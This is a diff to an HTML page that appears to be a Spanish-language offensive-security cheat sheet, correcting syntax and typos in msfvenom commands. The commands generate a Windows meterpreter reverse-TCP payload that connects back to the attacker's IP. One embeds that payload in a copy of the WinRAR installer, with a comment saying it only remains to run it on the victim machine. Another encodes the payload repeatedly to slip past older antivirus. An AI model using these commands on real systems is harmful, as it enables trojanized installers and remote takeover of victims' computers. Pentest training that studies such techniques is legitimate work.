@@ -95,18 +95,18 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;KALI_IP&gt; LPORT=&lt;LOCA
             </section>
             <section class="code-card">
               <h3>Cargar payload en un fichero</h3>
-              <pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST &lt;nuestra_ip&gt; LPORT 1234 -e x86/shikata_ga_nai -f exe -x ~/Downloads/winrar_install.exe &gt; winrar.exe
+              <pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;nuestra_ip&gt; LPORT=1234 -e x86/shikata_ga_nai -f exe -x ~/Downloads/winrar_install.exe &gt; winrar.exe
 
-# Cargamos el payload en una copia (winrar.exe) del instalador que acabamos de descargar (winrar_install.exe) con el  parámetro -x. Solo falta ejectar el código en la máquina víctima</code></pre>
+# Cargamos el payload en una copia (winrar.exe) del instalador que acabamos de descargar (winrar_install.exe) con el parámetro -x. Solo falta ejecutar el código en la máquina víctima</code></pre>
             </section>
             <section class="code-card">
               <h3>Evadir AntiVirus antiguos</h3>
               <pre><code>msfvenom --list encoders  # Listar encodes
 
-msfvenom -p windows/meterpreter/reverse_tcp LHOST &lt;nuestra_ip&gt; LPORT 1234 -i 10 -e x86/shitaka_ga_nai -f exe &gt; shell.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;nuestra_ip&gt; LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe &gt; shell.exe
 
 # x86 para que se pueda usar en arquitecturas x64 y x32 y ese encoder -e porque sirve para linux y windows. 
-# -i 10 quiere decir que lo encriptamos 10 veces, 10 iteraciones para que sea mejor y tenga más probabilidad de evadir un antivirus</code></pre>
+# -i 10 aplica 10 iteraciones del encoder. Esto no cifra el payload: lo codifica para cambiar su firma, aunque no garantiza evadir un antivirus moderno</code></pre>
             </section>
             <h2>Tags</h2>
             <div class="tag-list">
